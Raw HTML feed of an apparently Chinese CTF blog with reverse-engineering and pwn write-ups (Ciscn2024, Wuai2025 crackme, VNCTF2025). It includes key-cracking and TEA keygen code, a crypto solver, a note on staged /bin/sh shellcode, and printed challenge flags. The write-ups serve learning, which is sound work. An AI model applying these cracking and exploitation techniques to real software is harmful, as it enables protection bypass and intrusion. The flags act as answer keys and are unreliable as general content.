class="line">&#123;</span><br><span class="line">Enc[j] = pParam1[j % <span class="number">2</span>] ^ KeyList[j];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">auto</span> calc_value = <span class="built_in">calc</span>(Enc, <span class="number">48</span>);</span><br><span class="line"><span class="keyword">if</span> (calc_value == <span class="number">0xF703DF16</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Cracked:%02X%02X\n&quot;</span>, pParam1[<span class="number">0</span>], pParam1[<span class="number">1</span>]);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出”Cracked:79BC”，得到密钥为<strong>79BC</strong>。</p><h2 id="获取Flag"><a href="#获取Flag" class="headerlink" title="获取Flag"></a>获取Flag</h2><p>输入密钥和一个正在运行的进程ID，再次进行调试。</p><p><img src="/2025/02/20/Ciscn-reverse-vt/32.png" alt="alt text"></p><p>发现可以正常走到decrypt_flag函数调用处。</p><p><img src="/2025/02/20/Ciscn-reverse-vt/33.png" alt="alt text"></p><p>单步执行完decrypt_flag函数，跳转到flag指针处，即可看到解密后的flag。</p><p><strong>flag{MjExNTY3MzE3NTQzMjI&#x3D;}</strong></p><p><img src="/2025/02/20/Ciscn-reverse-vt/34.png" alt="alt text"></p><h2 id="心得"><a href="#心得" class="headerlink" title="心得"></a>心得</h2><p>这次全流程做下来感觉其实面对复杂的混淆和花指令得有耐心去分析，耐心的动调观察数据变化以及注释关键点，这样才能更好理顺思路和理解代码流程。</p><p>这次花指令全都是手动去除，因为怕写脚本处理的花指令不完整，也就是担心去除的不完整导致程序执行错乱。现在发现其实是可以参考开源的那个混淆项目，看他用到了哪些花指令，然后结合实际汇编进行分析，应该是可以将所有花指令的情况都列出来的，然后进行一键脚本去除。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Ciscn2024-逆向0解题-VT&quot;&gt;&lt;a href=&quot;#Ciscn2024-逆向0解题-VT&quot; class=&quot;headerlink&quot; title=&quot;Ciscn2024-逆向0解题-VT&quot;&gt;&lt;/a&gt;Ciscn2024-逆向0解题-VT&lt;/h1&gt;&lt;h2 id=&quot;前</summary>
      
    
    
    
    <category term="CTF比赛" scheme="https://tkazer.github.io/categories/CTF%E6%AF%94%E8%B5%9B/"/>
    
    
  </entry>
  
  <entry>
    <title>吾爱2025-Windows逆向高级题-5</title>
    <link href="https://tkazer.github.io/2025/02/18/Wuai2025Windows5/"/>
    <id>https://tkazer.github.io/2025/02/18/Wuai2025Windows5/</id>
    <published>2025-02-18T09:32:48.000Z</published>
    <updated>2025-02-21T03:18:30.467Z</updated>
    
    <content type="html"><![CDATA[<h1 id="吾爱2025-Windows逆向高级题-5"><a href="#吾爱2025-Windows逆向高级题-5" class="headerlink" title="吾爱2025-Windows逆向高级题-5"></a>吾爱2025-Windows逆向高级题-5</h1><p>考点：异步消息执行，变种tea展开、变种MD5、时间戳、Flag分段检查</p><h1 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h1><p>这一段是获取两个编辑框的内容，即uid和flag，然后flag要符合异或的那一系列条件，实际格式是flag{…}。</p><p><img src="/2025/02/18/Wuai2025Windows5/1.png" alt="alt text"></p><p>跟到这边发现有一系列函数，main_program里面的执行验证按钮后主流程，execute是main_program里面通过不同消息来执行不同命令的函数。（都是自命名的函数，仅代表个人想法）</p><p><img src="/2025/02/18/Wuai2025Windows5/2.png" alt="alt text"></p><h2 id="execute函数"><a href="#execute函数" class="headerlink" title="execute函数"></a>execute函数</h2><p>其他消息：将flag括号内数据进行unhex（如1122字符串直接转成0x11,0x22数据）</p><p>0x35消息：获取当前半小时整点时间戳数据。</p><p><img src="/2025/02/18/Wuai2025Windows5/3.png" alt="alt text"></p><p>0x55消息：通过利用变种MD5+Salt将解密完数据的前十六字节计算得到4字节数值。</p><p><img src="/2025/02/18/Wuai2025Windows5/4.png" alt="alt text"></p><p>0x25消息：unhex后数据进行解密（Decrypt函数）。</p><p><img src="/2025/02/18/Wuai2025Windows5/5.png" alt="alt text"></p><h2 id="main-program函数"><a href="#main-program函数" class="headerlink" title="main_program函数"></a>main_program函数</h2><h3 id="第一部分"><a href="#第一部分" class="headerlink" title="第一部分"></a>第一部分</h3><p>获取flag括号内数据通过消息分发执行execute的unhex消息，然后再执行execute的Decrypt函数，解密unhex后的数据，将解密完的数据长度赋值给v12。</p><p><img src="/2025/02/18/Wuai2025Windows5/6.png" alt="alt text"></p><h3 id="第二部分"><a href="#第二部分" class="headerlink" title="第二部分"></a>第二部分</h3><p>将解密完数据的前16字节进行custom_MD5，得到4字节数据，然后判断解密后数据第17个字节开始四个字节是否和计算得到的4字节数据相等。</p><p>如果相等就再次判断v12，即解密后数据长度，判断是否等于20。</p><p>再调用execute的时间戳获取消息，得到8字节时间戳数据。</p><p>最后再检查解密后数据前8字节是否等于时间戳数据，以及第九个字节往后8字节是否等于编辑框输入的uid。</p><h3 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h3><p>输入的flag得是被和Decrypt相对于的加密函数进行加密后的数据，加密前格式：{半时整点时间戳（8字节），uid（8字节），Custom_MD5（前面十六字节）（4字节），0x04填充（四个字节）}</p><p>最后一部分填充会在下面Decrypt函数里面说明来由。</p><p><img src="/2025/02/18/Wuai2025Windows5/7.png" alt="alt text"></p><h2 id="Decrypt函数（sub-7FF7FAC92C40）"><a href="#Decrypt函数（sub-7FF7FAC92C40）" class="headerlink" title="Decrypt函数（sub_7FF7FAC92C40）"></a>Decrypt函数（sub_7FF7FAC92C40）</h2><p>要求unhex后数据长度要是8的倍数，且利用一系列计算得到v12这个数据，参与内部解密的Key生成，最后还要求解密完的数据符合一系列条件验证。</p><p><img src="/2025/02/18/Wuai2025Windows5/8.png" alt="alt text"></p><h3 id="解密后数据条件验证"><a href="#解密后数据条件验证" class="headerlink" title="解密后数据条件验证"></a>解密后数据条件验证</h3><p>从这部分逻辑代码可以分析，他是将最后v8指向最后一个数据，然后v9赋值最后一个数据，然后v8循环递减，直到当前v8指向v8开始往前的第v9个指针结束，然后最后解密后数据长度&#x3D;当前长度-v9。</p><p>已知解密后前面已经占用了20字节（时间戳+uid+md5），在main_program也已知解密后数据长度要等于20，所以可以知道这边v9必须等于4，所以v8等于4，最后这边一共占用4个字节，即{4,4,4,4}，这样经过这边的验证最后的size才会等于20。</p><p><img src="/2025/02/18/Wuai2025Windows5/9.png" alt="alt text"></p><h3 id="dec函数"><a href="#dec函数" class="headerlink" title="dec函数"></a>dec函数</h3><p>将unhex后数据按8字节分块进行tea的解密，tea加密的Key由上一层传入的v12通过RC4得到，且每次解密Key都会变化（固定变化），直接动调就可以拿到几次解密用到的Key值。</p><p><img src="/2025/02/18/Wuai2025Windows5/10.png" alt="alt text"></p><p>下面一系列解密就是tea的解密，不过是展开，可以数出一共是12轮，且Delta直接可以通过两次sum的值相减得到（由于tea解密这边应该是加上sum，ida伪代码展示是减，但是实际计算后数值一样），B979379E就是tea解密用到的Delta。</p><p><img src="/2025/02/18/Wuai2025Windows5/11.png" alt="alt text"></p><p>所以就可以通过动调得到的几次Key和Delta写出tea的加密代码。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">uint32_t</span> key1[] =</span><br><span class="line">&#123;</span><br><span class="line">    <span class="number">0xD7851B65</span>,</span><br><span class="line">    <span class="number">0x473457C1</span>,</span><br><span class="line">    <span class="number">0x1231F787</span>,</span><br><span class="line">    <span class="number">0x9ACD6D9A</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">uint32_t</span> key2[] =</span><br><span class="line">&#123;</span><br><span class="line">    <span class="number">0xB728E994</span>,</span><br><span class="line">    <span class="number">0x1746382E</span>,</span><br><span class="line">    <span class="number">0xC52D865C</span>,</span><br><span class="line">    <span class="number">0x10778A6E</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">uint32_t</span> key3[] =</span><br><span class="line">&#123;</span><br><span class="line">    <span class="number">0x7459F437</span>,</span><br><span class="line">    <span class="number">0x90D1E5D</span>,</span><br><span class="line">    <span class="number">0x779375B2</span>,</span><br><span class="line">    <span class="number">0xEFCB8541</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">tea_encrypt</span><span class="params">(<span class="type">uint32_t</span> v[<span class="number">2</span>], <span class="type">const</span> <span class="type">uint32_t</span> k[<span class="number">4</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>], sum = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint32_t</span> delta = <span class="number">0xB979379E</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">uint32_t</span> i = <span class="number">0</span>; i &lt; <span class="number">12</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        sum += delta;</span><br><span class="line">        v1 += ((v0 &lt;&lt; <span class="number">4</span>) + k[<span class="number">2</span>]) ^ (v0 + sum) ^ ((v0 &gt;&gt; <span class="number">5</span>) + k[<span class="number">3</span>]);</span><br><span class="line">        v0 += ((v1 &lt;&lt; <span class="number">4</span>) + k[<span class="number">0</span>]) ^ (v1 + sum) ^ ((v1 &gt;&gt; <span class="number">5</span>) + k[<span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    v[<span class="number">0</span>] = v0;</span><br><span class="line">    v[<span class="number">1</span>] = v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="主解题流程"><a href="#主解题流程" class="headerlink" title="主解题流程"></a>主解题流程</h2><p>通过用c++实现这部分代码，获取时间戳数据（8字节）。</p><p><img src="/2025/02/18/Wuai2025Windows5/12.png" alt="alt text"></p><p>然后将uid转为8字节字节数据拼接到时间戳字节后面。</p><p>MD5值暂时填充4个0x00，将MD5值和4个0x04字节拼接上。</p><p>将完整数据进行tea_encrypt，再用flag{}包裹填入编辑框进行验证。</p><p>在MD5生成代码处，断点在箭头处，即可得到MD5四字节数据。</p><p><img src="/2025/02/18/Wuai2025Windows5/13.png" alt="alt text"></p><p>最终再重复上面步骤即可得到flag。</p><h1 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">tea_encrypt</span><span class="params">(<span class="type">uint32_t</span> v[<span class="number">2</span>], <span class="type">const</span> <span class="type">uint32_t</span> k[<span class="number">4</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>], sum = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint32_t</span> delta = <span class="number">0xB979379E</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">uint32_t</span> i = <span class="number">0</span>; i &lt; <span class="number">12</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        sum += delta;</span><br><span class="line">        v1 += ((v0 &lt;&lt; <span class="number">4</span>) + k[<span class="number">2</span>]) ^ (v0 + sum) ^ ((v0 &gt;&gt; <span class="number">5</span>) + k[<span class="number">3</span>]);</span><br><span class="line">        v0 += ((v1 &lt;&lt; <span class="number">4</span>) + k[<span class="number">0</span>]) ^ (v1 + sum) ^ ((v1 &gt;&gt; <span class="number">5</span>) + k[<span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    v[<span class="number">0</span>] = v0;</span><br><span class="line">    v[<span class="number">1</span>] = v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">输入格式：</span></span><br><span class="line"><span class="comment">flag</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">tea_enc</span></span><br><span class="line"><span class="comment">(</span></span><br><span class="line"><span class="comment">    timestamp 8字节</span></span><br><span class="line"><span class="comment">    uid 8字节</span></span><br><span class="line"><span class="comment">    md5 4字节</span></span><br><span class="line"><span class="comment">    0x04*4 4字节填充</span></span><br><span class="line"><span class="comment">)</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 动调得到的三个Key</span></span><br><span class="line">    <span class="type">uint32_t</span> key1[] =</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="number">0xD7851B65</span>,</span><br><span class="line">        <span class="number">0x473457C1</span>,</span><br><span class="line">        <span class="number">0x1231F787</span>,</span><br><span class="line">        <span class="number">0x9ACD6D9A</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">uint32_t</span> key2[] =</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="number">0xB728E994</span>,</span><br><span class="line">        <span class="number">0x1746382E</span>,</span><br><span class="line">        <span class="number">0xC52D865C</span>,</span><br><span class="line">        <span class="number">0x10778A6E</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">uint32_t</span> key3[] =</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="number">0x7459F437</span>,</span><br><span class="line">        <span class="number">0x90D1E5D</span>,</span><br><span class="line">        <span class="number">0x779375B2</span>,</span><br><span class="line">        <span class="number">0xEFCB8541</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span> timestamp_bytes[<span class="number">8</span>]&#123;&#125;;</span><br><span class="line">    <span class="comment">// 8字节下的UID</span></span><br><span class="line">    <span class="type">uint8_t</span> uid[]&#123; <span class="number">0x50</span>, <span class="number">0x04</span>, <span class="number">0x23</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span> &#125;;</span><br><span class="line">    <span class="comment">// 动调得到MD5四个字节，加上最后4个0x04填充</span></span><br><span class="line">    <span class="type">uint8_t</span> md5_and_pad[]&#123; <span class="number">0xD2</span>, <span class="number">0x63</span>, <span class="number">0xE4</span>, <span class="number">0xE6</span>, <span class="number">0x04</span>, <span class="number">0x04</span>, <span class="number">0x04</span>, <span class="number">0x04</span> &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 半时整点时间戳计算</span></span><br><span class="line">    FILETIME time&#123;&#125;;</span><br><span class="line">    DWORD64 timestamp&#123;&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">GetSystemTimeAsFileTime</span>(&amp;time);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>((<span class="type">void</span>*)(&amp;timestamp), (<span class="type">void</span>*)(&amp;time), <span class="number">8</span>);</span><br><span class="line">    timestamp = <span class="number">1800</span> * ((timestamp / <span class="number">0x989680</span> - <span class="number">0x2B6109100LL</span>) / <span class="number">0x708</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>((<span class="type">void</span>*)(timestamp_bytes), (<span class="type">void</span>*)(&amp;timestamp), <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 加密数据</span></span><br><span class="line">    <span class="built_in">tea_encrypt</span>((<span class="type">uint32_t</span>*)timestamp_bytes, (<span class="type">uint32_t</span>*)key1);</span><br><span class="line">    <span class="built_in">tea_encrypt</span>((<span class="type">uint32_t</span>*)uid, (<span class="type">uint32_t</span>*)key2);</span><br><span class="line">    <span class="built_in">tea_encrypt</span>((<span class="type">uint32_t</span>*)md5_and_pad, (<span class="type">uint32_t</span>*)key3);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;flag&#123;&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%02X&quot;</span>, timestamp_bytes[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%02X&quot;</span>, uid[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%02X&quot;</span>, md5_and_pad[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="心得"><a href="#心得" class="headerlink" title="心得"></a>心得</h1><p>动调调试分析程序主体流程很重要，要先了解大概执行框架才能逐步往下层分析，且上层一些代码条件有助于下层的分析。</p><p>然后踩了一个严重的坑就是IDA伪代码里面的变量值和实际值一些情况下是不一样的，之前写题没在意那么多，这次很多地方都发现有这种问题，卡了我分析好久。所以关键代码段最好用汇编逐步分析，看实际数据的变化。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;吾爱2025-Windows逆向高级题-5&quot;&gt;&lt;a href=&quot;#吾爱2025-Windows逆向高级题-5&quot; class=&quot;headerlink&quot; title=&quot;吾爱2025-Windows逆向高级题-5&quot;&gt;&lt;/a&gt;吾爱2025-Windows逆向高级题-5&lt;/</summary>
      
    
    
    
    <category term="逆向练习" scheme="https://tkazer.github.io/categories/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/"/>
    
    
  </entry>
  
  <entry>
    <title>VNCTF2025</title>
    <link href="https://tkazer.github.io/2025/02/12/VNCTF2025/"/>
    <id>https://tkazer.github.io/2025/02/12/VNCTF2025/</id>
    <published>2025-02-12T14:53:27.000Z</published>
    <updated>2025-02-12T15:10:39.099Z</updated>
    
    <content type="html"><![CDATA[<h1 id="VNCTF-2025-WP"><a href="#VNCTF-2025-WP" class="headerlink" title="VNCTF 2025 WP"></a>VNCTF 2025 WP</h1><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="VN-Lang"><a href="#VN-Lang" class="headerlink" title="VN_Lang"></a>VN_Lang</h3><p>IDA分析VN_Lang_XXXX.exe字符串搜索VN得到Flag。</p><p><img src="/2025/02/12/VNCTF2025/vnlang.png" alt="vnlang"></p><h4 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h4><p><strong>VNCTF{i9UQEqFXgbJBI1LasSZmBxxXSNYFRyCkpydKvhZo7d9Ai}</strong></p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="easymath"><a href="#easymath" class="headerlink" title="easymath"></a>easymath</h3><p>ai一把梭。</p><p>dec.sage:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> ZZ, PolynomialRing</span><br><span class="line"></span><br><span class="line">R = PolynomialRing(ZZ, <span class="string">&quot;x&quot;</span>)</span><br><span class="line">x = R.gen()</span><br><span class="line">polynomial = x**<span class="number">3</span> - <span class="number">15264966144147258587171776703005926730518438603688487721465</span>*x**<span class="number">2</span> + <span class="number">76513250180666948190254989703768338299723386154619468700730085586057638716434556720233473454400881002065319569292923</span>*x - <span class="number">125440939526343949494022113552414275560444252378483072729156599143746741258532431664938677330319449789665352104352620658550544887807433866999963624320909981994018431526620619</span></span><br><span class="line"></span><br><span class="line">roots = polynomial.roots()</span><br><span class="line">primes = [<span class="built_in">int</span>(r[<span class="number">0</span>]) <span class="keyword">for</span> r <span class="keyword">in</span> roots]</span><br><span class="line">N = primes[<span class="number">0</span>] * primes[<span class="number">1</span>] * primes[<span class="number">2</span>]</span><br><span class="line">c = <span class="number">24884251313604275189259571459005374365204772270250725590014651519125317134307160341658199551661333326703566996431067426138627332156507267671028553934664652787411834581708944</span></span><br><span class="line"></span><br><span class="line">c = <span class="number">24884251313604275189259571459005374365204772270250725590014651519125317134307160341658199551661333326703566996431067426138627332156507267671028553934664652787411834581708944</span></span><br><span class="line"></span><br><span class="line">square_roots = []</span><br><span class="line"><span class="keyword">for</span> p <span class="keyword">in</span> primes:</span><br><span class="line">    root = power_mod(c, (p + <span class="number">1</span>) // <span class="number">4</span>, p) </span><br><span class="line">    square_roots.append((root, p))</span><br><span class="line"></span><br><span class="line">possible_flags = []</span><br><span class="line"><span class="keyword">for</span> signs <span class="keyword">in</span> [(<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>), (<span class="number">1</span>, <span class="number">1</span>, -<span class="number">1</span>), (<span class="number">1</span>, -<span class="number">1</span>, <span class="number">1</span>), (-<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>), (-<span class="number">1</span>, -<span class="number">1</span>, <span class="number">1</span>), (-<span class="number">1</span>, <span class="number">1</span>, -<span class="number">1</span>), (<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>), (-<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>)]:</span><br><span class="line">    crt_solution = crt([signs[i] * square_roots[i][<span class="number">0</span>] % primes[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)], primes)</span><br><span class="line">    possible_flags.append(crt_solution)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(possible_flags)</span><br><span class="line"><span class="comment">#[55745449774035533604132123837354458550470434042238203561240895515463850669082841278843372190705837595737691650856096087615682512159689935652128349720357413457859444632369350, 125115225001407144448151513636019415817956856295873219712252392836948941964102523530173092625214575404136789335483571504152920024161726170211008255272440379726560839152801102, 121308689781282565030341210716083690163638176623957028113928015415750030819041672272612041957024041097790808247093717003449846352538078398824952421335589115302596759718820027, 60203414044033723113683626590079903689763905879374101193373685550258360403003508805935592269106120673140798276984048897114005911074753100616094921754147882416738708813989459, 325714524936805045870599916394859742487396082609853016904206306797799294429908134765584705104874385528562768869049154397624863645707696788955369048469602267457592373819517, 4132249745061384463680902836330585396806075754526044615228583727996710439490759392326635373295408691874543857258903655100698535269355468175011202985320866691421671807800592, 65237525482310226380338486962334371870680346499108971535782913593488380855528922859003085061213329116524553827368571761436538976732680766383868702566762099577279722712631160, 69695489752308415889889989715059817009973818336244869167915703628282890589449590386095305139613612193927660453496524570934862375647743931347835274600552568536158986894251269]</span></span><br></pre></td></tr></table></figure><p>dec.py:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">p =[<span class="number">55745449774035533604132123837354458550470434042238203561240895515463850669082841278843372190705837595737691650856096087615682512159689935652128349720357413457859444632369350</span>, <span class="number">125115225001407144448151513636019415817956856295873219712252392836948941964102523530173092625214575404136789335483571504152920024161726170211008255272440379726560839152801102</span>, <span class="number">121308689781282565030341210716083690163638176623957028113928015415750030819041672272612041957024041097790808247093717003449846352538078398824952421335589115302596759718820027</span>, <span class="number">60203414044033723113683626590079903689763905879374101193373685550258360403003508805935592269106120673140798276984048897114005911074753100616094921754147882416738708813989459</span>, <span class="number">325714524936805045870599916394859742487396082609853016904206306797799294429908134765584705104874385528562768869049154397624863645707696788955369048469602267457592373819517</span>, <span class="number">4132249745061384463680902836330585396806075754526044615228583727996710439490759392326635373295408691874543857258903655100698535269355468175011202985320866691421671807800592</span>, <span class="number">65237525482310226380338486962334371870680346499108971535782913593488380855528922859003085061213329116524553827368571761436538976732680766383868702566762099577279722712631160</span>, <span class="number">69695489752308415889889989715059817009973818336244869167915703628282890589449590386095305139613612193927660453496524570934862375647743931347835274600552568536158986894251269</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> f <span class="keyword">in</span> p:</span><br><span class="line">    f_bytes = f.to_bytes((f.bit_length() + <span class="number">7</span>) // <span class="number">8</span>, byteorder=<span class="string">&quot;big&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> f_bytes.startswith(<span class="string">b&#x27;VNCTF&#x27;</span>):</span><br><span class="line">        <span class="built_in">print</span>(f_bytes.decode())</span><br><span class="line">        </span><br><span class="line"><span class="comment"># VNCTF&#123;90dcfb2dfb21a21e0c8715cbf3643f4a47d3e2e4b3f7b7975954e6d9701d9648&#125;</span></span><br></pre></td></tr></table></figure><h4 id="Flag-1"><a href="#Flag-1" class="headerlink" title="Flag"></a>Flag</h4><p><strong>VNCTF{90dcfb2dfb21a21e0c8715cbf3643f4a47d3e2e4b3f7b7975954e6d9701d9648}</strong></p><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="签个到吧"><a href="#签个到吧" class="headerlink" title="签个到吧"></a>签个到吧</h3><p>checksec</p><p><img src="/2025/02/12/VNCTF2025/pwn2.png" alt="QQ_1739074297610"></p><p>IDA分析pwn程序</p><p><img src="/2025/02/12/VNCTF2025/pwn1.png" alt="QQ_1739073892530"></p><p>发现就给22字节大小，可以写一个标准最短shell，但是execute函数清空了寄存器。</p><p><img src="/2025/02/12/VNCTF2025/pwn3.png" alt="QQ_1739074388173"></p><p>所以可以通过一段shellcode再read一次更大的空间。</p><p>接下来用shellcode调用&#x2F;bin&#x2F;sh即可。</p><p>参考：<a 